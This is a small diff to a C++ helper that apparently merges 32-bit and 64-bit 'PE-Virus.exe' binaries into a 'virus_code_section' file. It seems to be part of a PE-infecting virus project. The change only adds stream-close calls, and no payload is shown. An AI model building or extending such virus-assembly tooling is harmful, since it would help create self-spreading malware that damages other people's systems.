@@ -26,6 +26,7 @@ int main(int argc, char *argv[]) {
 
     ifstream ifs32(p32_path, std::ios_base::binary);
     ifs32.read((char *)&v32[0], std::filesystem::file_size(p32));
+    ifs32.close();
 
     std::string p64_path = path + "file\\virusexe\\x64\\PE-Virus.exe";
     std::filesystem::path p64{p64_path};
@@ -34,6 +35,7 @@ int main(int argc, char *argv[]) {
 
     ifstream ifs64(p64_path, std::ios_base::binary);
     ifs64.read((char *)&v64[0], std::filesystem::file_size(p64));
+    ifs64.close();
 
     vector<unsigned char> merge;
 
@@ -42,4 +44,5 @@ int main(int argc, char *argv[]) {
 
     ofstream ofs(path + "file\\virusbody\\virus_code_section", std::ios_base::binary);
     ofs.write((char *)&merge[0], merge.size());
+    ofs.close();
 }
